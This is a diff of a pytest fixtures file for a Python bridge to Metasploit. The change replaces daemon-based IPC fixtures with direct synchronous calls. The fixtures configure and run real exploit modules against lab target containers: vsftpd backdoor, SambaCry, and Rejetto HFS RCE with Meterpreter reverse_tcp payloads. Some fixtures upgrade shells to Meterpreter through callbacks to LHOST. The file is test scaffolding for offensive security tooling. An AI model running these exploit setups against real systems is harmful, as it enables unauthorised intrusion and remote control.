@@ -1,14 +1,15 @@
-"""Pytest fixtures and configuration."""
+"""Pytest fixtures and configuration for MSF tests.
 
-import asyncio
+This module provides fixtures for testing the direct Pyo3 bridge API.
+The API is synchronous and does not require a daemon process.
+"""
+
 import os
-import subprocess
 import time
-from pathlib import Path
 
 import pytest
 
-from assassinate.ipc import MsfClient
+import msf
 
 
 # =============================================================================
@@ -30,6 +31,10 @@ def pytest_configure(config):
         "markers",
         "shell: marks tests that require a shell session",
     )
+    config.addinivalue_line(
+        "markers",
+        "db: marks tests that require database connection",
+    )
 
 
 # =============================================================================
@@ -47,160 +52,72 @@ def get_target_host() -> str:
     return os.environ.get("TARGET_HOST", "target-linux")
 
 
+def get_target_smb_port() -> int:
+    """Get the target SMB port (default: 445)."""
+    return int(os.environ.get("TARGET_SMB_PORT", "445"))
+
+
 def get_target_ftp_port() -> int:
     """Get the target FTP port (default: 21)."""
     return int(os.environ.get("TARGET_FTP_PORT", "21"))
 
 
-def get_target_shell_port() -> int:
-    """Get the target shell listener port."""
-    return int(os.environ.get("TARGET_SHELL_PORT", "4445"))
+def get_msf_root() -> str:
+    """Get MSF installation path."""
+    path = os.environ.get("MSF_ROOT", "~/Projects/metasploit-framework")
+    return os.path.expanduser(path)
 
 
-def get_target_backdoor_port() -> int:
-    """Get the target backdoor port (vsftpd backdoor shell)."""
-    return int(os.environ.get("TARGET_BACKDOOR_PORT", "6200"))
+# =============================================================================
+# Core Fixtures
+# =============================================================================
 
 
 @pytest.fixture(scope="session")
-def daemon_process():
-    """Start daemon for testing session."""
-    # Check CARGO_TARGET_DIR first (used in CI containers), then fall back to default
-    cargo_target_dir = os.environ.get("CARGO_TARGET_DIR")
-    if cargo_target_dir:
-        daemon_path = Path(cargo_target_dir) / "release" / "daemon"
-    else:
-        daemon_path = (
-            Path(__file__).parent.parent.parent
-            / "rust"
-            / "daemon"
-            / "target"
-            / "release"
-            / "daemon"
-        )
+def msf_init():
+    """Initialize MSF framework once for all tests.
 
-    # Check MSF_ROOT env var first (used in CI), then fall back to default
-    msf_root_env = os.environ.get("MSF_ROOT")
-    if msf_root_env:
-        msf_root = Path(msf_root_env)
-    else:
-        msf_root = Path(__file__).parent.parent.parent / "metasploit-framework"
+    This is a session-scoped fixture that initializes the embedded Ruby VM
+    and loads the Metasploit framework. It only runs once per test session.
+    """
+    msf_root = get_msf_root()
+    if not os.path.exists(msf_root):
+        pytest.skip(f"MSF not found at {msf_root}. Set MSF_ROOT env var.")
 
-    if not daemon_path.exists():
-        pytest.skip("Daemon not built - run: cargo build --release -p daemon")
+    if not msf.is_initialized():
+        msf.init_msf(msf_root)
 
-    # Kill any existing daemon
-    subprocess.run(
-        ["pkill", "-f", "daemon.*msf-root"], stderr=subprocess.DEVNULL
-    )
-    time.sleep(1)
+    yield
 
-    # Clean up shared memory (use glob since subprocess doesn't expand wildcards)
-    import glob as glob_module
-    for shm_file in glob_module.glob("/dev/shm/assassinate_msf_ipc*"):
-        try:
-            os.remove(shm_file)
-        except OSError:
-            pass
-
-    # Build environment with LD_LIBRARY_PATH if needed (for rbenv Ruby)
-    env = os.environ.copy()
-
-    # Ensure ASSASSINATE_WORKSPACE is set for credential reporting
-    if "ASSASSINATE_WORKSPACE" not in env:
-        env["ASSASSINATE_WORKSPACE"] = "default"
-
-    # Check if using rbenv and add library path
-    rbenv_root = Path.home() / ".rbenv"
-    if rbenv_root.exists():
-        # Find the Ruby version being used
-        ruby_version_file = Path(__file__).parent.parent / ".ruby-version"
-        if ruby_version_file.exists():
-            ruby_version = ruby_version_file.read_text().strip()
-            ruby_lib_path = rbenv_root / "versions" / ruby_version / "lib"
-            if ruby_lib_path.exists():
-                existing_ld_path = env.get("LD_LIBRARY_PATH", "")
-                env["LD_LIBRARY_PATH"] = (
-                    f"{ruby_lib_path}:{existing_ld_path}"
-                    if existing_ld_path
-                    else str(ruby_lib_path)
-                )
-
-    # Start daemon with output logged to file for debugging
-    daemon_log = Path("/tmp/daemon_test.log")
-    daemon_log_file = daemon_log.open("w")
-    proc = subprocess.Popen(
-        [
-            str(daemon_path),
-            "--msf-root",
-            str(msf_root),
-            "--log-level",
-            "debug",
-        ],
-        stdout=daemon_log_file,
-        stderr=subprocess.STDOUT,
-        env=env,
-    )
-
-    # Wait for daemon to start and initialize
-    time.sleep(8)
-
-    # Verify it's running
-    if proc.poll() is not None:
-        daemon_log_file.close()
-        log_content = daemon_log.read_text() if daemon_log.exists() else "No log"
-        print("\n=== DAEMON STARTUP FAILED ===")
-        print(f"Command: {daemon_path} --msf-root {msf_root}")
-        print(f"Log:\n{log_content}")
-        print(f"LD_LIBRARY_PATH: {env.get('LD_LIBRARY_PATH')}")
-        print(f"ASSASSINATE_WORKSPACE: {env.get('ASSASSINATE_WORKSPACE')}")
-        pytest.fail(f"Daemon failed to start:\n{log_content}")
-
-    # Double-check shared memory was created
-    import glob
-
-    shm_files = glob.glob("/dev/shm/assassinate_msf_ipc*")
-    if not shm_files:
-        # Wait a bit more for slow initialization
-        time.sleep(5)
-        shm_files = glob.glob("/dev/shm/assassinate_msf_ipc*")
-        if not shm_files:
-            daemon_log_file.close()
-            log_content = daemon_log.read_text() if daemon_log.exists() else "No log"
-            pytest.fail(
-                f"Daemon started but shared memory not created. Daemon may have crashed.\nLog: {log_content}"
-            )
-
-    yield proc
-
-    # Cleanup
-    proc.terminate()
-    try:
-        proc.wait(timeout=5)
-    except subprocess.TimeoutExpired:
-        proc.kill()
-    daemon_log_file.close()
+    # No cleanup needed - framework stays loaded for session duration
 
 
 @pytest.fixture
-async def client(daemon_process):
-    """Get connected MSF client."""
-    client = MsfClient()
-    await client.connect()
-    yield client
-    await client.disconnect()
+def exploit_module(msf_init):
+    """Create a test exploit module (SambaCry)."""
+    module = msf.create_module("exploit/linux/samba/is_known_pipename")
+    yield module
 
 
 @pytest.fixture
-async def test_module(client):
-    """Create a test module for testing."""
-    # Use vsftpd backdoor - well-known, simple exploit
-    module_id = await client.create_module(
-        "exploit/unix/ftp/vsftpd_234_backdoor"
-    )
-    yield module_id
-    # Cleanup module to prevent memory leak
-    await client.delete_module(module_id)
+def auxiliary_module(msf_init):
+    """Create a test auxiliary module (SMB version scanner)."""
+    module = msf.create_module("auxiliary/scanner/smb/smb_version")
+    yield module
+
+
+@pytest.fixture
+def post_module(msf_init):
+    """Create a test post module."""
+    module = msf.create_module("post/multi/gather/env")
+    yield module
+
+
+@pytest.fixture
+def payload_module(msf_init):
+    """Create a test payload module."""
+    module = msf.create_module("payload/cmd/unix/reverse_bash")
+    yield module
 
 
 # =============================================================================
@@ -220,363 +137,61 @@ def integration_env():
         pytest.skip("Not in integration test environment (INTEGRATION_TESTS != true)")
     return {
         "target_host": get_target_host(),
+        "smb_port": get_target_smb_port(),
         "ftp_port": get_target_ftp_port(),
-        "shell_port": get_target_shell_port(),
-        "backdoor_port": get_target_backdoor_port(),
     }
 
 
 @pytest.fixture
-async def shell_session(client, integration_env):
-    """Exploit vsftpd backdoor and return a shell session.
+def shell_session(msf_init, integration_env):
+    """Exploit SambaCry and return a shell session.
 
     This fixture:
-    1. Creates the vsftpd_234_backdoor exploit module
+    1. Creates the SambaCry exploit module
     2. Configures it for the target container
-    3. Runs the exploit
-    4. Waits for session to be created
-    5. Yields the session ID
-    6. Cleans up the session after test
+    3. Runs the exploit with cmd/unix/interact payload
+    4. Yields the Session object
+    5. Cleans up the session after test
 
     Requires: INTEGRATION_TESTS=true, target-linux container running
     """
     target_host = integration_env["target_host"]
-    ftp_port = integration_env["ftp_port"]
 
-    print(f"\n🎯 Exploiting vsftpd backdoor on {target_host}:{ftp_port}")
+    print(f"\n[*] Exploiting SambaCry on {target_host}")
 
-    # Create exploit module
-    module_id = await client.create_module("exploit/unix/ftp/vsftpd_234_backdoor")
-    session_id = None  # Initialize before try block for finally clause
+    # Create and configure exploit
+    exploit = msf.create_module("exploit/linux/samba/is_known_pipename")
+    exploit.options.RHOSTS = target_host
+    exploit.options.SMB_SHARE_NAME = "myshare"
 
+    # Run exploit
+    session = exploit.exploit("cmd/unix/interact", timeout=60)
+
+    if session is None:
+        pytest.fail("Failed to get shell session from exploit")
+
+    print(f"[+] Got shell session: {session.sid}")
+
+    yield session
+
+    # Cleanup
     try:
-        # Configure exploit
-        await client.module_set_option(module_id, "RHOSTS", target_host)
-        await client.module_set_option(module_id, "RPORT", str(ftp_port))
-
-        # Get sessions before exploit
-        sessions_before = await client.sessions_list()
-        session_ids_before = set(sessions_before) if sessions_before else set()
-
-        # Run exploit with appropriate payload for shell session
-        # module_exploit has 30s default timeout for exploit execution
-        print("   Running exploit...")
-        result = await client.module_exploit(module_id, "cmd/unix/interact")
-        print(f"   Exploit result: {result}")
-
-        # Wait for session with timeout
-        for attempt in range(30):  # 30 seconds timeout
-            await asyncio.sleep(1)
-            sessions_after = await client.sessions_list()
-            session_ids_after = set(sessions_after) if sessions_after else set()
-
-            new_sessions = session_ids_after - session_ids_before
-            if new_sessions:
-                session_id = list(new_sessions)[0]
-                print(f"   ✓ Got shell session: {session_id}")
-                break
-
-            if attempt % 5 == 0:
-                print(f"   Waiting for session... ({attempt}s)")
-
-        if session_id is None:
-            pytest.fail("Failed to get shell session from exploit")
-
-        yield session_id
-
-    finally:
-        # Cleanup
-        await client.delete_module(module_id)
-        if session_id is not None:
-            try:
-                await client.session_kill(session_id)
-                print(f"   🧹 Cleaned up session {session_id}")
-            except Exception:
-                pass  # Session may already be dead
-
-
-@pytest.fixture
-async def meterpreter_session(client, shell_session):
-    """Upgrade shell session to Meterpreter.
-
-    This fixture:
-    1. Uses the shell_session fixture to get a shell
-    2. Upgrades it to Meterpreter using shell_to_meterpreter
-    3. Waits for Meterpreter session
-    4. Yields the Meterpreter session ID
-    5. Cleans up after test
-
-    Note: The original shell session is cleaned up by shell_session fixture.
-    """
-    # Get LHOST - use the test container's IP on the docker network
-    # In docker-compose, services can reach each other by service name
-    lhost = os.environ.get("LHOST", "integration-test")
-    lport = int(os.environ.get("LPORT", "4433"))
-
-    print(f"\n🔄 Upgrading shell {shell_session} to Meterpreter")
-    print(f"   LHOST={lhost}, LPORT={lport}")
-
-    # Get sessions before upgrade
-    sessions_before = await client.sessions_list()
-    session_ids_before = set(sessions_before) if sessions_before else set()
-
-    # Upgrade shell to Meterpreter
-    try:
-        await client.session_shell_to_meterpreter(shell_session, lhost, lport)
-    except Exception as e:
-        print(f"   Warning: Upgrade command returned: {e}")
-
-    # Wait for Meterpreter session
-    meterpreter_session_id = None
-    for attempt in range(60):  # 60 seconds timeout for upgrade
-        await asyncio.sleep(1)
-        sessions_after = await client.sessions_list()
-
-        for sid, info in sessions_after.items():
-            if sid in session_ids_before:
-                continue
-            session_type = await client.session_type(sid)
-            if "meterpreter" in session_type.lower():
-                meterpreter_session_id = sid
-                print(f"   ✓ Got Meterpreter session: {sid}")
-                break
-
-        if meterpreter_session_id:
-            break
-
-        if attempt % 10 == 0:
-            print(f"   Waiting for Meterpreter session... ({attempt}s)")
-
-    if meterpreter_session_id is None:
-        pytest.fail("Failed to upgrade to Meterpreter session")
-
-    yield meterpreter_session_id
-
-    # Cleanup Meterpreter session
-    try:
-        await client.session_kill(meterpreter_session_id)
-        print(f"   🧹 Cleaned up Meterpreter session {meterpreter_session_id}")
+        session.kill()
+        print(f"[*] Cleaned up session {session.sid}")
     except Exception:
         pass
 
 
 @pytest.fixture
-async def direct_shell_session(client, integration_env):
-    """Connect to the pre-configured shell listener on the target.
+def configured_exploit(msf_init, integration_env):
+    """Return a SambaCry exploit configured for the target but not yet executed.
 
-    This fixture connects to the socat shell listener on port 4445,
-    providing a simple shell session without needing to exploit anything.
-
-    Uses direct socket connection + CommandShell registration (no MSF payload protocol).
-    Faster than shell_session for tests that just need any shell.
+    Useful for tests that want to test validation, check(), etc. before exploiting.
     """
     target_host = integration_env["target_host"]
-    shell_port = integration_env["shell_port"]
 
-    print(f"\n🔌 Connecting to shell listener on {target_host}:{shell_port}")
+    exploit = msf.create_module("exploit/linux/samba/is_known_pipename")
+    exploit.options.RHOSTS = target_host
+    exploit.options.SMB_SHARE_NAME = "myshare"
 
-    session_id = None
-    try:
-        # Create shell session using direct socket connection
-        session_id = await client.create_shell_session(target_host, shell_port, timeout=10)
-        print(f"   ✓ Got direct shell session: {session_id}")
-
-        yield session_id
-
-    except Exception as e:
-        pytest.skip(f"Could not connect to direct shell listener: {e}")
-
-    finally:
-        if session_id is not None:
-            try:
-                await client.session_kill(session_id)
-                print(f"   🧹 Cleaned up session {session_id}")
-            except Exception:
-                pass
-
-
-@pytest.fixture
-async def direct_meterpreter_session(client, direct_shell_session, integration_env):
-    """Create a Meterpreter session by upgrading a shell session.
-
-    This fixture:
-    1. Uses direct_shell_session to get a reliable shell via socat
-    2. Starts a multi/handler listening for Meterpreter connections
-    3. Calls shell_to_meterpreter() to upgrade the shell
-    4. Waits for the Meterpreter session to connect
-    5. Yields the Meterpreter session ID
-    6. Cleans up after test
-
-    Requires:
-    - INTEGRATION_TESTS=true
-    - target-linux container running
-    """
-    shell_session_id = direct_shell_session
-
-    # LHOST/LPORT for the handler (integration-test container listens)
-    # IMPORTANT: LHOST must be the actual IP of this container, NOT 0.0.0.0!
-    # The payload needs to connect back to us, so it needs our real IP.
-    lhost = os.environ.get("LHOST")
-    if not lhost:
-        # Auto-detect container IP
-        import socket
-        lhost = socket.gethostbyname(socket.gethostname())
-    lport = int(os.environ.get("LPORT", "4433"))
-
-    print(f"\n🔄 Upgrading shell session {shell_session_id} to Meterpreter")
-    print(f"   Handler: {lhost}:{lport}")
-
-    meterpreter_session_id = None
-
-    try:
-        # Step 1: Get sessions before upgrade
-        sessions_before = await client.sessions_list()
-        session_ids_before = set(sessions_before) if sessions_before else set()
-        print(f"   Sessions before: {session_ids_before}")
-
-        # Step 2: Initiate shell to Meterpreter upgrade
-        # This runs a post module that:
-        # - Generates a Meterpreter payload
-        # - Uploads it to the target
-        # - Executes it
-        # - The payload connects back to LHOST:LPORT
-        #
-        # NOTE: We use PAYLOAD_OVERRIDE to force x64 Meterpreter because:
-        # 1. MSF's shell_to_meterpreter has a bug where regex /86/ matches both x86 and x86_64
-        # 2. x86/linux Meterpreter has limited functionality (no transport operations)
-        # 3. x64 Meterpreter provides full feature support
-        print("   Initiating upgrade (forcing x64 payload)...")
-        try:
-            result = await client.session_shell_to_meterpreter(
-                shell_session_id,
-                lhost,
-                lport,
-                extra_options={
-                    "PAYLOAD_OVERRIDE": "linux/x64/meterpreter/reverse_tcp",
-                    "PLATFORM_OVERRIDE": "linux",
-                },
-            )
-            print(f"   Upgrade initiated: {result}")
-        except Exception as e:
-            # The upgrade command may return an error even if it works
-            print(f"   Upgrade command returned: {e}")
-
-        # Step 3: Wait for Meterpreter session
-        print("   Waiting for Meterpreter session...")
-        for attempt in range(90):  # 90 second timeout for upgrade
-            await asyncio.sleep(1)
-            sessions_after = await client.sessions_list()  # Returns list[int]
-
-            for sid in sessions_after:
-                if sid in session_ids_before:
-                    continue
-                # Check if it's a Meterpreter session
-                try:
-                    session_type = await client.session_type(sid)
-                    if "meterpreter" in session_type.lower():
-                        meterpreter_session_id = sid
-                        print(f"   ✓ Got Meterpreter session: {meterpreter_session_id}")
-                        break
-                except Exception:
-                    continue
-
-            if meterpreter_session_id:
-                break
-
-            if attempt % 15 == 0 and attempt > 0:
-                print(f"   Still waiting... ({attempt}s)")
-
-        if meterpreter_session_id is None:
-            pytest.fail("Meterpreter session did not connect within timeout")
-
-        yield meterpreter_session_id
-
-    finally:
-        # Cleanup Meterpreter session (shell session cleaned up by direct_shell_session)
-        if meterpreter_session_id is not None:
-            try:
-                await client.session_kill(meterpreter_session_id)
-                print(f"   🧹 Cleaned up Meterpreter session {meterpreter_session_id}")
-            except Exception:
-                pass
-
-
-@pytest.fixture
-async def windows_meterpreter_session(client, integration_env):
-    """Create a Windows Meterpreter session via Rejetto HFS exploit.
-
-    This fixture directly exploits the Windows target using CVE-2014-6287
-    (Rejetto HFS RCE) and spawns a Meterpreter session without needing
-    to upgrade from a shell.
-
-    Requires:
-    - INTEGRATION_TESTS=true
-    - target-windows container running with HFS on port 80
-    - TARGET_WINDOWS_HOST env var (defaults to "assassinate-target-windows")
-
-    This is MUCH faster than the shell upgrade approach and more reliable.
-    """
-    import random
-    target_host = os.environ.get("TARGET_WINDOWS_HOST", "assassinate-target-windows")
-    lhost = os.environ.get("LHOST")
-    if not lhost:
-        import socket
-        lhost = socket.gethostbyname(socket.gethostname())
-    # Use random port to avoid conflicts between tests
-    lport = random.randint(44000, 45000)
-
-    print(f"\n🎯 Exploiting Windows target via Rejetto HFS")
-    print(f"   Target: {target_host}:80")
-    print(f"   Handler: {lhost}:{lport}")
-
-    session_id = None
-
-    try:
-        # Create and configure the exploit module
-        module_id = await client.create_module("exploit/windows/http/rejetto_hfs_exec")
-        await client.module_set_option(module_id, "RHOSTS", target_host)
-        await client.module_set_option(module_id, "LHOST", lhost)
-        await client.module_set_option(module_id, "LPORT", str(lport))
-        # Use random SRVPORT to avoid conflicts between tests
-        srvport = random.randint(8800, 8900)
-        await client.module_set_option(module_id, "SRVPORT", str(srvport))
-
-        print("   Running exploit...")
-
-        # Run exploit with Meterpreter payload (32-bit since HFS is 32-bit)
-        # NOTE: Increase timeout to 120s - Windows VM can be slow with multiple exploits
-        session_id = await client.module_exploit(
-            module_id,
-            "windows/meterpreter/reverse_tcp",
-            timeout=120.0
-        )
-
-        if session_id:
-            print(f"   ✓ Got Windows Meterpreter session: {session_id}")
-        else:
-            pytest.skip("Rejetto HFS exploit did not return a session - is Windows target running?")
-
-        yield session_id
-
-    except Exception as e:
-        pytest.skip(f"Could not create Windows Meterpreter session: {e}")
-
-    finally:
-        if session_id is not None:
-            try:
-                await client.session_kill(session_id)
-                print(f"   🧹 Cleaned up Windows Meterpreter session {session_id}")
-            except Exception:
-                pass
-        # Clean up any background jobs (handlers, staging servers)
-        try:
-            jobs = await client.job_list()
-            for job_id in jobs:
-                try:
-                    await client.job_kill(job_id)
-                except Exception:
-                    pass
-            if jobs:
-                print(f"   🧹 Cleaned up {len(jobs)} background jobs")
-        except Exception:
-            pass
+    return exploit
